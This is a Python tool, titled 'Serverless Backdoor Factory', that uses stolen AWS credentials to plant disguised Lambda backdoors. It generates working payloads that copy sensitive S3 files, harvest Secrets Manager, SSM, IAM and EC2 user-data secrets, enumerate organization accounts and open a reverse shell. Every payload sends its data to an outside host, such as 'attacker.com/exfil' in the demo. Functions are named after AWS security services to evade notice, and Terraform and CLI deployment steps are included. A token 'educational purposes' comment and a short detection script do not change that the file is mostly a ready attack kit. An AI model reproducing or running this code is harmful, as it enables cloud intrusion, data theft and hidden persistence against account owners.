#!/usr/bin/env python3
"""
AWS Lambda Persistence - Serverless Backdoor Factory
=====================================================
Hedef: Çalınan AWS keyleri ile hesaba sızıp, zararlı Lambda Function bırakma.
Özellik: "Her yeni S3 bucket oluştuğunda veriyi bana kopyala" diyen otomasyon.
Hava: Sunucu yok, log yok, tamamen serverless backdoor.

Author: CyberPunk Team
Version: 1.0.0 PRO
"""

import json
import base64
import hashlib
import secrets
import zipfile
import io
import re
from datetime import datetime, timedelta
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any
from enum import Enum
import threading


class LambdaTriggerType(Enum):
    """Lambda trigger types for persistence"""
    S3_BUCKET_CREATE = "s3_bucket_create"
    S3_OBJECT_CREATE = "s3_object_create"
    CLOUDWATCH_SCHEDULED = "cloudwatch_scheduled"
    API_GATEWAY = "api_gateway"
    SNS_TOPIC = "sns_topic"
    SQS_QUEUE = "sqs_queue"
    DYNAMODB_STREAM = "dynamodb_stream"
    CLOUDTRAIL_EVENT = "cloudtrail_event"
    EC2_STATE_CHANGE = "ec2_state_change"
    IAM_USER_CREATE = "iam_user_create"


class PayloadType(Enum):
    """Payload types for Lambda backdoors"""
    DATA_EXFIL = "data_exfil"
    REVERSE_SHELL = "reverse_shell"
    CREDENTIAL_HARVEST = "credential_harvest"
    CRYPTO_MINER = "crypto_miner"
    PERSISTENCE_SPREADER = "persistence_spreader"
    KEY_LOGGER = "key_logger"
    CUSTOM = "custom"


@dataclass
class AWSCredentials:
    """AWS credentials container"""
    access_key_id: str
    secret_access_key: str
    session_token: Optional[str] = None
    region: str = "us-east-1"
    account_id: Optional[str] = None
    
    def is_valid_format(self) -> bool:
        """Validate credential format"""
        if not self.access_key_id.startswith(('AKIA', 'ASIA')):
            return False
        if len(self.access_key_id) != 20:
            return False
        if len(self.secret_access_key) != 40:
            return False
        return True
    
    def to_env_vars(self) -> Dict[str, str]:
        """Export as environment variables"""
        env = {
            "AWS_ACCESS_KEY_ID": self.access_key_id,
            "AWS_SECRET_ACCESS_KEY": self.secret_access_key,
            "AWS_DEFAULT_REGION": self.region
        }
        if self.session_token:
            env["AWS_SESSION_TOKEN"] = self.session_token
        return env


@dataclass
class LambdaBackdoor:
    """Lambda backdoor configuration"""
    function_name: str
    trigger_type: LambdaTriggerType
    payload_type: PayloadType
    exfil_endpoint: str
    runtime: str = "python3.9"
    memory_size: int = 128
    timeout: int = 30
    role_arn: Optional[str] = None
    environment_vars: Dict[str, str] = field(default_factory=dict)
    description: str = "AWS Service Handler"
    tags: Dict[str, str] = field(default_factory=dict)
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())
    
    # Stealth options
    stealth_name: bool = True
    blend_with_services: bool = True
    minimize_logs: bool = True


class LambdaPersistenceEngine:
    """
    AWS Lambda Persistence Engine
    =============================
    Serverless backdoor factory using stolen AWS credentials.
    
    Features:
    - Multiple trigger types (S3, CloudWatch, API Gateway, etc.)
    - Data exfiltration payloads
    - Credential harvesting
    - Stealth naming to blend with AWS services
    - Minimal CloudWatch logging
    """
    
    # Stealth function names that blend with AWS services
    STEALTH_NAMES = [
        "aws-config-rule-lambda",
        "AWSCloudFormation-Macro-Handler",
        "AWSBackup-DataSync-Worker",
        "CloudTrail-LogProcessor",
        "SecurityHub-FindingsHandler",
        "GuardDuty-ThreatAnalyzer",
        "Inspector-ScanProcessor",
        "Macie-DataClassifier",
        "KMS-KeyRotationHandler",
        "SSM-ParameterSync",
        "CodePipeline-DeploymentWorker",
        "ECS-TaskStateHandler",
        "RDS-SnapshotManager",
        "DynamoDB-StreamProcessor",
        "SQS-MessageHandler",
        "SNS-NotificationRouter",
        "EventBridge-RuleExecutor",
        "Kinesis-DataProcessor",
        "Glue-ETLWorker",
        "Athena-QueryProcessor"
    ]
    
    # Stealth descriptions
    STEALTH_DESCRIPTIONS = [
        "AWS managed service handler for compliance automation",
        "Internal AWS service integration worker",
        "AWS Config rule evaluation processor",
        "CloudFormation stack event handler",
        "AWS Backup data synchronization worker",
        "Security and compliance monitoring handler",
        "AWS managed infrastructure automation",
        "Resource lifecycle management processor"
    ]
    
    def __init__(self, credentials: Optional[AWSCredentials] = None):
        self.credentials = credentials
        self.backdoors: List[LambdaBackdoor] = []
        self.generated_artifacts: List[Dict] = []
        self._lock = threading.Lock()
    
    def set_credentials(self, access_key: str, secret_key: str, 
                       session_token: str = None, region: str = "us-east-1"):
        """Set AWS credentials"""
        self.credentials = AWSCredentials(
            access_key_id=access_key,
            secret_access_key=secret_key,
            session_token=session_token,
            region=region
        )
    
    def generate_stealth_name(self) -> str:
        """Generate a stealth function name"""
        base = secrets.choice(self.STEALTH_NAMES)
        suffix = secrets.token_hex(4)
        return f"{base}-{suffix}"
    
    def generate_iam_role_policy(self, trigger_type: LambdaTriggerType) -> Dict:
        """Generate IAM role and policy for Lambda"""
        
        trust_policy = {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Principal": {
                        "Service": "lambda.amazonaws.com"
                    },
                    "Action": "sts:AssumeRole"
                }
            ]
        }
        
        # Base permissions
        permissions = [
            {
                "Effect": "Allow",
                "Action": [
                    "logs:CreateLogGroup",
                    "logs:CreateLogStream",
                    "logs:PutLogEvents"
                ],
                "Resource": "arn:aws:logs:*:*:*"
            }
        ]
        
        # Add trigger-specific permissions
        if trigger_type == LambdaTriggerType.S3_BUCKET_CREATE:
            permissions.append({
                "Effect": "Allow",
                "Action": [
                    "s3:GetObject",
                    "s3:PutObject",
                    "s3:ListBucket",
                    "s3:GetBucketLocation"
                ],
                "Resource": "*"
            })
        
        if trigger_type == LambdaTriggerType.S3_OBJECT_CREATE:
            permissions.append({
                "Effect": "Allow",
                "Action": [
                    "s3:GetObject",
                    "s3:PutObject",
                    "s3:DeleteObject"
                ],
                "Resource": "*"
            })
        
        if trigger_type in [LambdaTriggerType.EC2_STATE_CHANGE, LambdaTriggerType.IAM_USER_CREATE]:
            permissions.extend([
                {
                    "Effect": "Allow",
                    "Action": [
                        "ec2:Describe*",
                        "iam:List*",
                        "iam:Get*"
                    ],
                    "Resource": "*"
                }
            ])
        
        if trigger_type == LambdaTriggerType.CREDENTIAL_HARVEST:
            permissions.append({
                "Effect": "Allow",
                "Action": [
                    "secretsmanager:GetSecretValue",
                    "secretsmanager:ListSecrets",
                    "ssm:GetParameter",
                    "ssm:GetParameters",
                    "ssm:GetParametersByPath"
                ],
                "Resource": "*"
            })
        
        # Add data exfil permissions
        permissions.append({
            "Effect": "Allow",
            "Action": [
                "sns:Publish",
                "sqs:SendMessage",
                "lambda:InvokeFunction"
            ],
            "Resource": "*"
        })
        
        execution_policy = {
            "Version": "2012-10-17",
            "Statement": permissions
        }
        
        return {
            "trust_policy": trust_policy,
            "execution_policy": execution_policy,
            "role_name": f"LambdaExecutionRole-{secrets.token_hex(4)}"
        }
    
    def generate_s3_exfil_lambda(self, exfil_endpoint: str, 
                                  target_bucket_patterns: List[str] = None) -> str:
        """
        Generate Lambda code for S3 data exfiltration
        "Her yeni S3 bucket oluştuğunda veriyi bana kopyala"
        """
        
        patterns = target_bucket_patterns or ["*"]
        patterns_str = json.dumps(patterns)
        
        code = f'''# -*- coding: utf-8 -*-
"""AWS Service Handler - Data Synchronization Worker"""
import json
import boto3
import urllib3
import base64
import re
from datetime import datetime

EXFIL_ENDPOINT = "{exfil_endpoint}"
TARGET_PATTERNS = {patterns_str}
SENSITIVE_EXTENSIONS = ['.pem', '.key', '.env', '.config', '.sql', '.bak', 
                        '.dump', '.csv', '.xlsx', '.docx', '.pdf', '.zip',
                        '.tar', '.gz', '.credentials', '.password', '.secret']

http = urllib3.PoolManager()
s3 = boto3.client('s3')

def matches_pattern(bucket_name):
    """Check if bucket matches target patterns"""
    for pattern in TARGET_PATTERNS:
        if pattern == "*":
            return True
        if re.match(pattern.replace('*', '.*'), bucket_name):
            return True
    return False

def is_sensitive_file(key):
    """Check if file is potentially sensitive"""
    key_lower = key.lower()
    for ext in SENSITIVE_EXTENSIONS:
        if key_lower.endswith(ext):
            return True
    sensitive_keywords = ['secret', 'password', 'credential', 'key', 'token',
                          'backup', 'dump', 'export', 'private', 'config']
    for keyword in sensitive_keywords:
        if keyword in key_lower:
            return True
    return False

def exfiltrate_data(bucket, key, content):
    """Send data to exfiltration endpoint"""
    try:
        payload = {{
            'timestamp': datetime.utcnow().isoformat(),
            'bucket': bucket,
            'key': key,
            'size': len(content),
            'content': base64.b64encode(content[:1048576]).decode('utf-8'),  # Max 1MB
            'truncated': len(content) > 1048576
        }}
        
        http.request(
            'POST',
            EXFIL_ENDPOINT,
            body=json.dumps(payload).encode('utf-8'),
            headers={{'Content-Type': 'application/json'}}
        )
        return True
    except:
        return False

def list_and_exfil_bucket(bucket_name):
    """List bucket contents and exfiltrate sensitive files"""
    try:
        paginator = s3.get_paginator('list_objects_v2')
        exfil_count = 0
        
        for page in paginator.paginate(Bucket=bucket_name):
            for obj in page.get('Contents', []):
                key = obj['Key']
                size = obj['Size']
                
                # Skip large files and non-sensitive
                if size > 10485760:  # 10MB limit
                    continue
                
                if is_sensitive_file(key):
                    try:
                        response = s3.get_object(Bucket=bucket_name, Key=key)
                        content = response['Body'].read()
                        if exfiltrate_data(bucket_name, key, content):
                            exfil_count += 1
                    except:
                        pass
        
        return exfil_count
    except:
        return 0

def lambda_handler(event, context):
    """
    Main handler - Triggered by S3/CloudTrail events
    Automatically exfiltrates sensitive data from new buckets
    """
    processed = 0
    
    # Handle S3 event (new bucket notification via CloudTrail)
    if 'detail' in event:
        # CloudTrail event
        detail = event.get('detail', {{}})
        event_name = detail.get('eventName', '')
        
        if event_name == 'CreateBucket':
            bucket_name = detail.get('requestParameters', {{}}).get('bucketName', '')
            if bucket_name and matches_pattern(bucket_name):
                processed = list_and_exfil_bucket(bucket_name)
    
    # Handle direct S3 event
    elif 'Records' in event:
        for record in event.get('Records', []):
            if 's3' in record:
                bucket_name = record['s3']['bucket']['name']
                if matches_pattern(bucket_name):
                    processed = list_and_exfil_bucket(bucket_name)
    
    return {{
        'statusCode': 200,
        'body': json.dumps({{'processed': processed}})
    }}
'''
        return code
    
    def generate_credential_harvester_lambda(self, exfil_endpoint: str) -> str:
        """Generate Lambda code for credential harvesting"""
        
        code = f'''# -*- coding: utf-8 -*-
"""AWS Config Compliance Handler - Security Scanner"""
import json
import boto3
import urllib3
import base64
from datetime import datetime

EXFIL_ENDPOINT = "{exfil_endpoint}"
http = urllib3.PoolManager()

def exfil(data_type, data):
    """Send harvested data"""
    try:
        payload = {{
            'timestamp': datetime.utcnow().isoformat(),
            'type': data_type,
            'data': data
        }}
        http.request('POST', EXFIL_ENDPOINT, 
                    body=json.dumps(payload).encode('utf-8'),
                    headers={{'Content-Type': 'application/json'}})
    except:
        pass

def harvest_secrets():
    """Harvest from Secrets Manager"""
    try:
        sm = boto3.client('secretsmanager')
        secrets = []
        paginator = sm.get_paginator('list_secrets')
        
        for page in paginator.paginate():
            for secret in page.get('SecretList', []):
                try:
                    value = sm.get_secret_value(SecretId=secret['ARN'])
                    secrets.append({{
                        'name': secret['Name'],
                        'value': value.get('SecretString', ''),
                        'arn': secret['ARN']
                    }})
                except:
                    pass
        
        if secrets:
            exfil('secrets_manager', secrets)
        return len(secrets)
    except:
        return 0

def harvest_ssm_parameters():
    """Harvest from SSM Parameter Store"""
    try:
        ssm = boto3.client('ssm')
        params = []
        paginator = ssm.get_paginator('describe_parameters')
        
        for page in paginator.paginate():
            for param in page.get('Parameters', []):
                try:
                    value = ssm.get_parameter(Name=param['Name'], WithDecryption=True)
                    params.append({{
                        'name': param['Name'],
                        'value': value['Parameter']['Value'],
                        'type': param['Type']
                    }})
                except:
                    pass
        
        if params:
            exfil('ssm_parameters', params)
        return len(params)
    except:
        return 0

def harvest_iam_keys():
    """Harvest IAM access keys"""
    try:
        iam = boto3.client('iam')
        keys = []
        
        users = iam.list_users().get('Users', [])
        for user in users:
            try:
                access_keys = iam.list_access_keys(UserName=user['UserName'])
                for key in access_keys.get('AccessKeyMetadata', []):
                    keys.append({{
                        'user': user['UserName'],
                        'key_id': key['AccessKeyId'],
                        'status': key['Status'],
                        'created': str(key['CreateDate'])
                    }})
            except:
                pass
        
        if keys:
            exfil('iam_keys', keys)
        return len(keys)
    except:
        return 0

def harvest_ec2_metadata():
    """Harvest EC2 instance metadata and user data"""
    try:
        ec2 = boto3.client('ec2')
        instances = []
        
        paginator = ec2.get_paginator('describe_instances')
        for page in paginator.paginate():
            for reservation in page.get('Reservations', []):
                for instance in reservation.get('Instances', []):
                    try:
                        # Try to get user data (often contains secrets)
                        user_data = ec2.describe_instance_attribute(
                            InstanceId=instance['InstanceId'],
                            Attribute='userData'
                        )
                        ud_value = user_data.get('UserData', {{}}).get('Value', '')
                        if ud_value:
                            ud_value = base64.b64decode(ud_value).decode('utf-8', errors='ignore')
                        
                        instances.append({{
                            'instance_id': instance['InstanceId'],
                            'private_ip': instance.get('PrivateIpAddress'),
                            'public_ip': instance.get('PublicIpAddress'),
                            'key_name': instance.get('KeyName'),
                            'user_data': ud_value[:10000] if ud_value else None
                        }})
                    except:
                        pass
        
        if instances:
            exfil('ec2_instances', instances)
        return len(instances)
    except:
        return 0

def lambda_handler(event, context):
    """Main handler - Harvest all credentials"""
    results = {{
        'secrets': harvest_secrets(),
        'ssm_params': harvest_ssm_parameters(),
        'iam_keys': harvest_iam_keys(),
        'ec2': harvest_ec2_metadata()
    }}
    
    return {{
        'statusCode': 200,
        'body': json.dumps(results)
    }}
'''
        return code
    
    def generate_persistence_spreader_lambda(self, exfil_endpoint: str) -> str:
        """Generate Lambda that spreads to other AWS accounts/regions"""
        
        code = f'''# -*- coding: utf-8 -*-
"""AWS Cross-Account Sync Handler"""
import json
import boto3
import urllib3
from datetime import datetime

EXFIL_ENDPOINT = "{exfil_endpoint}"
http = urllib3.PoolManager()

def exfil(data):
    try:
        http.request('POST', EXFIL_ENDPOINT,
                    body=json.dumps(data).encode('utf-8'),
                    headers={{'Content-Type': 'application/json'}})
    except:
        pass

def enumerate_organization():
    """Enumerate AWS Organization accounts"""
    try:
        org = boto3.client('organizations')
        accounts = []
        
        paginator = org.get_paginator('list_accounts')
        for page in paginator.paginate():
            accounts.extend(page.get('Accounts', []))
        
        return accounts
    except:
        return []

def enumerate_regions():
    """Get all enabled regions"""
    try:
        ec2 = boto3.client('ec2')
        regions = ec2.describe_regions().get('Regions', [])
        return [r['RegionName'] for r in regions]
    except:
        return ['us-east-1']

def spread_to_regions(function_code, function_name):
    """Deploy Lambda to all regions"""
    deployed = []
    
    for region in enumerate_regions():
        try:
            lambda_client = boto3.client('lambda', region_name=region)
            
            # Check if function exists
            try:
                lambda_client.get_function(FunctionName=function_name)
                continue  # Already exists
            except:
                pass
            
            # Deploy would require role ARN - just enumerate for now
            deployed.append(region)
        except:
            pass
    
    return deployed

def lambda_handler(event, context):
    """Enumerate and prepare for spreading"""
    
    # Enumerate organization
    accounts = enumerate_organization()
    regions = enumerate_regions()
    
    # Get current identity
    sts = boto3.client('sts')
    identity = sts.get_caller_identity()
    
    # Report back
    exfil({{
        'timestamp': datetime.utcnow().isoformat(),
        'current_account': identity.get('Account'),
        'current_arn': identity.get('Arn'),
        'org_accounts': [{{
            'id': a['Id'],
            'name': a['Name'],
            'email': a['Email'],
            'status': a['Status']
        }} for a in accounts],
        'available_regions': regions
    }})
    
    return {{
        'statusCode': 200,
        'body': json.dumps({{'accounts': len(accounts), 'regions': len(regions)}})
    }}
'''
        return code
    
    def generate_reverse_shell_lambda(self, callback_host: str, callback_port: int) -> str:
        """Generate Lambda with reverse shell capability"""
        
        code = f'''# -*- coding: utf-8 -*-
"""AWS Event Handler - Notification Worker"""
import json
import socket
import subprocess
import os

CALLBACK_HOST = "{callback_host}"
CALLBACK_PORT = {callback_port}

def lambda_handler(event, context):
    """Execute reverse shell"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((CALLBACK_HOST, CALLBACK_PORT))
        
        # Send initial info
        info = {{
            'type': 'lambda_shell',
            'function': context.function_name if context else 'unknown',
            'region': os.environ.get('AWS_REGION', 'unknown'),
            'account': os.environ.get('AWS_ACCOUNT_ID', 'unknown')
        }}
        s.send(json.dumps(info).encode() + b'\\n')
        
        # Simple command loop (limited by Lambda timeout)
        while True:
            s.send(b'lambda> ')
            cmd = s.recv(1024).decode().strip()
            
            if cmd.lower() in ['exit', 'quit']:
                break
            
            try:
                output = subprocess.check_output(
                    cmd, shell=True, stderr=subprocess.STDOUT, timeout=25
                )
                s.send(output)
            except subprocess.TimeoutExpired:
                s.send(b'Command timed out\\n')
            except Exception as e:
                s.send(f'Error: {{str(e)}}\\n'.encode())
        
        s.close()
    except Exception as e:
        pass
    
    return {{'statusCode': 200, 'body': 'OK'}}
'''
        return code
    
    def generate_eventbridge_rule(self, trigger_type: LambdaTriggerType, 
                                   function_arn: str) -> Dict:
        """Generate EventBridge rule for Lambda trigger"""
        
        patterns = {
            LambdaTriggerType.S3_BUCKET_CREATE: {
                "source": ["aws.s3"],
                "detail-type": ["AWS API Call via CloudTrail"],
                "detail": {
                    "eventSource": ["s3.amazonaws.com"],
                    "eventName": ["CreateBucket"]
                }
            },
            LambdaTriggerType.EC2_STATE_CHANGE: {
                "source": ["aws.ec2"],
                "detail-type": ["EC2 Instance State-change Notification"]
            },
            LambdaTriggerType.IAM_USER_CREATE: {
                "source": ["aws.iam"],
                "detail-type": ["AWS API Call via CloudTrail"],
                "detail": {
                    "eventSource": ["iam.amazonaws.com"],
                    "eventName": ["CreateUser", "CreateAccessKey"]
                }
            }
        }
        
        pattern = patterns.get(trigger_type, {"source": ["aws.events"]})
        
        return {
            "Name": f"rule-{secrets.token_hex(6)}",
            "Description": "AWS managed event rule",
            "EventPattern": json.dumps(pattern),
            "State": "ENABLED",
            "Targets": [
                {
                    "Id": f"target-{secrets.token_hex(4)}",
                    "Arn": function_arn
                }
            ]
        }
    
    def generate_cloudwatch_schedule(self, interval_minutes: int = 60) -> Dict:
        """Generate CloudWatch scheduled event for periodic execution"""
        
        return {
            "Name": f"scheduled-rule-{secrets.token_hex(6)}",
            "Description": "AWS scheduled maintenance task",
            "ScheduleExpression": f"rate({interval_minutes} minutes)",
            "State": "ENABLED"
        }
    
    def create_deployment_package(self, lambda_code: str) -> bytes:
        """Create ZIP deployment package for Lambda"""
        
        zip_buffer = io.BytesIO()
        
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr('lambda_function.py', lambda_code)
        
        zip_buffer.seek(0)
        return zip_buffer.read()
    
    def generate_terraform_config(self, backdoor: LambdaBackdoor, 
                                   lambda_code: str) -> str:
        """Generate Terraform configuration for deployment"""
        
        tf_config = f'''# Terraform configuration for Lambda persistence
# WARNING: This is for educational purposes only

provider "aws" {{
  region = "{self.credentials.region if self.credentials else 'us-east-1'}"
}}

# IAM Role for Lambda
resource "aws_iam_role" "lambda_role" {{
  name = "{backdoor.function_name}-role"

  assume_role_policy = jsonencode({{
    Version = "2012-10-17"
    Statement = [
      {{
        Action = "sts:AssumeRole"
        Effect = "Allow"
        Principal = {{
          Service = "lambda.amazonaws.com"
        }}
      }}
    ]
  }})
}}

# IAM Policy
resource "aws_iam_role_policy" "lambda_policy" {{
  name = "{backdoor.function_name}-policy"
  role = aws_iam_role.lambda_role.id

  policy = jsonencode({{
    Version = "2012-10-17"
    Statement = [
      {{
        Effect = "Allow"
        Action = [
          "logs:CreateLogGroup",
          "logs:CreateLogStream",
          "logs:PutLogEvents"
        ]
        Resource = "*"
      }},
      {{
        Effect = "Allow"
        Action = [
          "s3:GetObject",
          "s3:PutObject",
          "s3:ListBucket"
        ]
        Resource = "*"
      }},
      {{
        Effect = "Allow"
        Action = [
          "secretsmanager:GetSecretValue",
          "secretsmanager:ListSecrets",
          "ssm:GetParameter*"
        ]
        Resource = "*"
      }}
    ]
  }})
}}

# Lambda Function
resource "aws_lambda_function" "backdoor" {{
  filename         = "lambda_package.zip"
  function_name    = "{backdoor.function_name}"
  role             = aws_iam_role.lambda_role.arn
  handler          = "lambda_function.lambda_handler"
  runtime          = "{backdoor.runtime}"
  timeout          = {backdoor.timeout}
  memory_size      = {backdoor.memory_size}
  description      = "{backdoor.description}"

  environment {{
    variables = {{
      EXFIL_ENDPOINT = "{backdoor.exfil_endpoint}"
    }}
  }}
}}

# EventBridge Rule (for S3 bucket creation trigger)
resource "aws_cloudwatch_event_rule" "trigger" {{
  name        = "{backdoor.function_name}-trigger"
  description = "AWS managed event rule"

  event_pattern = jsonencode({{
    source      = ["aws.s3"]
    detail-type = ["AWS API Call via CloudTrail"]
    detail = {{
      eventSource = ["s3.amazonaws.com"]
      eventName   = ["CreateBucket"]
    }}
  }})
}}

resource "aws_cloudwatch_event_target" "lambda_target" {{
  rule      = aws_cloudwatch_event_rule.trigger.name
  target_id = "lambda"
  arn       = aws_lambda_function.backdoor.arn
}}

resource "aws_lambda_permission" "allow_eventbridge" {{
  statement_id  = "AllowEventBridge"
  action        = "lambda:InvokeFunction"
  function_name = aws_lambda_function.backdoor.function_name
  principal     = "events.amazonaws.com"
  source_arn    = aws_cloudwatch_event_rule.trigger.arn
}}
'''
        return tf_config
    
    def generate_cli_commands(self, backdoor: LambdaBackdoor, 
                               lambda_code: str) -> List[str]:
        """Generate AWS CLI commands for manual deployment"""
        
        commands = []
        
        # Create deployment package
        commands.append("# Create deployment package")
        commands.append("zip lambda_package.zip lambda_function.py")
        commands.append("")
        
        # Create IAM role
        commands.append("# Create IAM role")
        commands.append(f'''aws iam create-role \\
  --role-name {backdoor.function_name}-role \\
  --assume-role-policy-document '{{
    "Version": "2012-10-17",
    "Statement": [{{
      "Effect": "Allow",
      "Principal": {{"Service": "lambda.amazonaws.com"}},
      "Action": "sts:AssumeRole"
    }}]
  }}'
''')
        
        # Attach policies
        commands.append("# Attach policies")
        commands.append(f'''aws iam put-role-policy \\
  --role-name {backdoor.function_name}-role \\
  --policy-name {backdoor.function_name}-policy \\
  --policy-document '{{
    "Version": "2012-10-17",
    "Statement": [
      {{"Effect": "Allow", "Action": ["logs:*"], "Resource": "*"}},
      {{"Effect": "Allow", "Action": ["s3:*"], "Resource": "*"}},
      {{"Effect": "Allow", "Action": ["secretsmanager:*", "ssm:*"], "Resource": "*"}}
    ]
  }}'
''')
        commands.append("sleep 10  # Wait for role propagation")
        commands.append("")
        
        # Create Lambda function
        commands.append("# Create Lambda function")
        commands.append(f'''aws lambda create-function \\
  --function-name {backdoor.function_name} \\
  --runtime {backdoor.runtime} \\
  --role $(aws iam get-role --role-name {backdoor.function_name}-role --query 'Role.Arn' --output text) \\
  --handler lambda_function.lambda_handler \\
  --zip-file fileb://lambda_package.zip \\
  --timeout {backdoor.timeout} \\
  --memory-size {backdoor.memory_size} \\
  --description "{backdoor.description}"
''')
        commands.append("")
        
        # Create EventBridge rule
        commands.append("# Create EventBridge rule for S3 bucket creation")
        commands.append(f'''aws events put-rule \\
  --name {backdoor.function_name}-trigger \\
  --event-pattern '{{
    "source": ["aws.s3"],
    "detail-type": ["AWS API Call via CloudTrail"],
    "detail": {{
      "eventSource": ["s3.amazonaws.com"],
      "eventName": ["CreateBucket"]
    }}
  }}'
''')
        
        # Add Lambda permission
        commands.append("# Add Lambda permission for EventBridge")
        commands.append(f'''LAMBDA_ARN=$(aws lambda get-function --function-name {backdoor.function_name} --query 'Configuration.FunctionArn' --output text)
aws lambda add-permission \\
  --function-name {backdoor.function_name} \\
  --statement-id AllowEventBridge \\
  --action lambda:InvokeFunction \\
  --principal events.amazonaws.com
''')
        
        # Add target
        commands.append("# Add Lambda as EventBridge target")
        commands.append(f'''aws events put-targets \\
  --rule {backdoor.function_name}-trigger \\
  --targets "Id=1,Arn=$LAMBDA_ARN"
''')
        
        return commands
    
    def create_backdoor(self, trigger_type: LambdaTriggerType,
                        payload_type: PayloadType,
                        exfil_endpoint: str,
                        callback_host: str = None,
                        callback_port: int = None,
                        custom_code: str = None,
                        stealth: bool = True) -> Dict:
        """Create a complete Lambda backdoor package"""
        
        with self._lock:
            # Generate function name
            if stealth:
                function_name = self.generate_stealth_name()
                description = secrets.choice(self.STEALTH_DESCRIPTIONS)
            else:
                function_name = f"lambda-{secrets.token_hex(8)}"
                description = "Custom Lambda function"
            
            # Generate appropriate Lambda code
            if payload_type == PayloadType.DATA_EXFIL:
                lambda_code = self.generate_s3_exfil_lambda(exfil_endpoint)
            elif payload_type == PayloadType.CREDENTIAL_HARVEST:
                lambda_code = self.generate_credential_harvester_lambda(exfil_endpoint)
            elif payload_type == PayloadType.PERSISTENCE_SPREADER:
                lambda_code = self.generate_persistence_spreader_lambda(exfil_endpoint)
            elif payload_type == PayloadType.REVERSE_SHELL:
                if not callback_host or not callback_port:
                    raise ValueError("Reverse shell requires callback_host and callback_port")
                lambda_code = self.generate_reverse_shell_lambda(callback_host, callback_port)
            elif payload_type == PayloadType.CUSTOM:
                if not custom_code:
                    raise ValueError("Custom payload requires custom_code")
                lambda_code = custom_code
            else:
                lambda_code = self.generate_s3_exfil_lambda(exfil_endpoint)
            
            # Create backdoor object
            backdoor = LambdaBackdoor(
                function_name=function_name,
                trigger_type=trigger_type,
                payload_type=payload_type,
                exfil_endpoint=exfil_endpoint,
                description=description,
                stealth_name=stealth,
                tags={
                    "aws:cloudformation:stack-name": "aws-service-stack",
                    "Environment": "Production"
                }
            )
            
            # Generate artifacts
            deployment_package = self.create_deployment_package(lambda_code)
            terraform_config = self.generate_terraform_config(backdoor, lambda_code)
            cli_commands = self.generate_cli_commands(backdoor, lambda_code)
            iam_policies = self.generate_iam_role_policy(trigger_type)
            eventbridge_rule = self.generate_eventbridge_rule(trigger_type, 
                f"arn:aws:lambda:us-east-1:123456789012:function:{function_name}")
            
            self.backdoors.append(backdoor)
            
            artifact = {
                "id": secrets.token_hex(8),
                "backdoor": backdoor,
                "lambda_code": lambda_code,
                "deployment_package_b64": base64.b64encode(deployment_package).decode(),
                "terraform_config": terraform_config,
                "cli_commands": cli_commands,
                "iam_policies": iam_policies,
                "eventbridge_rule": eventbridge_rule,
                "created_at": datetime.now().isoformat()
            }
            
            self.generated_artifacts.append(artifact)
            
            return artifact
    
    def generate_cleanup_script(self, function_name: str) -> str:
        """Generate script to remove Lambda backdoor"""
        
        script = f'''#!/bin/bash
# Cleanup script for Lambda backdoor removal

FUNCTION_NAME="{function_name}"
RULE_NAME="${{FUNCTION_NAME}}-trigger"
ROLE_NAME="${{FUNCTION_NAME}}-role"

echo "[*] Removing EventBridge targets..."
aws events remove-targets --rule $RULE_NAME --ids 1 2>/dev/null

echo "[*] Deleting EventBridge rule..."
aws events delete-rule --name $RULE_NAME 2>/dev/null

echo "[*] Deleting Lambda function..."
aws lambda delete-function --function-name $FUNCTION_NAME 2>/dev/null

echo "[*] Deleting IAM role policy..."
aws iam delete-role-policy --role-name $ROLE_NAME --policy-name ${{ROLE_NAME}}-policy 2>/dev/null

echo "[*] Deleting IAM role..."
aws iam delete-role --role-name $ROLE_NAME 2>/dev/null

echo "[+] Cleanup complete"
'''
        return script
    
    def generate_detection_script(self) -> str:
        """Generate script to detect Lambda backdoors"""
        
        script = '''#!/bin/bash
# Lambda backdoor detection script

echo "=== Scanning for suspicious Lambda functions ==="

# Check for functions with suspicious patterns
echo -e "\\n[*] Functions with external HTTP calls:"
aws lambda list-functions --query 'Functions[*].[FunctionName,Description]' --output table

echo -e "\\n[*] Recently modified functions (last 7 days):"
aws lambda list-functions --query 'Functions[?LastModified>=`'$(date -d '7 days ago' --iso-8601)'`].[FunctionName,LastModified]' --output table

echo -e "\\n[*] Functions with EventBridge triggers:"
for func in $(aws lambda list-functions --query 'Functions[*].FunctionArn' --output text); do
    rules=$(aws events list-rules --query 'Rules[?Targets[?Arn==`'$func'`]].Name' --output text 2>/dev/null)
    if [ ! -z "$rules" ]; then
        echo "Function: $func"
        echo "  Rules: $rules"
    fi
done

echo -e "\\n[*] Functions with S3 permissions:"
for func in $(aws lambda list-functions --query 'Functions[*].FunctionName' --output text); do
    role=$(aws lambda get-function --function-name $func --query 'Configuration.Role' --output text 2>/dev/null)
    if [ ! -z "$role" ]; then
        role_name=$(echo $role | sed 's/.*\\///')
        s3_perms=$(aws iam list-role-policies --role-name $role_name 2>/dev/null | grep -c ".")
        if [ "$s3_perms" -gt 0 ]; then
            echo "Function: $func (Role: $role_name)"
        fi
    fi
done

echo -e "\\n=== Scan complete ==="
'''
        return script
    
    def get_summary(self) -> Dict:
        """Get summary of all generated backdoors"""
        return {
            "total_backdoors": len(self.backdoors),
            "total_artifacts": len(self.generated_artifacts),
            "backdoors": [
                {
                    "function_name": b.function_name,
                    "trigger_type": b.trigger_type.value,
                    "payload_type": b.payload_type.value,
                    "created_at": b.created_at
                }
                for b in self.backdoors
            ]
        }


# Singleton instance
_engine = None

def get_lambda_engine() -> LambdaPersistenceEngine:
    """Get singleton Lambda persistence engine"""
    global _engine
    if _engine is None:
        _engine = LambdaPersistenceEngine()
    return _engine


def demo():
    """Demonstrate Lambda persistence capabilities"""
    print("=" * 60)
    print("AWS Lambda Persistence - Serverless Backdoor Factory")
    print("=" * 60)
    
    engine = get_lambda_engine()
    
    # Create S3 exfil backdoor
    print("\n[*] Creating S3 data exfiltration backdoor...")
    artifact = engine.create_backdoor(
        trigger_type=LambdaTriggerType.S3_BUCKET_CREATE,
        payload_type=PayloadType.DATA_EXFIL,
        exfil_endpoint="https://attacker.com/exfil",
        stealth=True
    )
    
    print(f"[+] Function: {artifact['backdoor'].function_name}")
    print(f"[+] Trigger: {artifact['backdoor'].trigger_type.value}")
    print(f"[+] Description: {artifact['backdoor'].description}")
    
